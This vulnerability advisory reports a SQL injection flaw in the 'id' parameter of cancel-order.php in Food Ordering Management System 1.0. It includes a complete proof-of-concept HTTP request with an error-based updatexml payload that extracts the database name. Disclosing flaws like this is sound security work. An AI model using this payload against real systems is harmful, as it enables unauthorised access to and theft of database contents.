## Food Ordering Management System has a front-end SQL injection vulnerability

## Affected version: 
Food Ordering Management System - 1.0

## Software:
https://www.sourcecodester.com/php/15689/food-ordering-management-system-php-and-mysql-free-source-code.html

## Vulnerability File:
/foms/routers/cancel-order.php

## Author
TanLong

## Description:
Food Ordering Management System 1.0 is vulnerable to an unrestricted SQL injection attack in /foms/routers/cancel-order.php with the attack parameter id. An attacker can exploit this vulnerability to directly obtain sensitive server information. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
POST /foms/routers/cancel-order.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 76
Origin: http://localhost
Connection: close
Referer: http://localhost/foms/admin-page.php
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

status=1233213&id=123%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q
```

Get database name 

![CleanShot 2024-09-05 at 14 38 03@2x](https://github.com/user-attachments/assets/7e87c3de-ebab-495b-9c17-d7898804fca5)



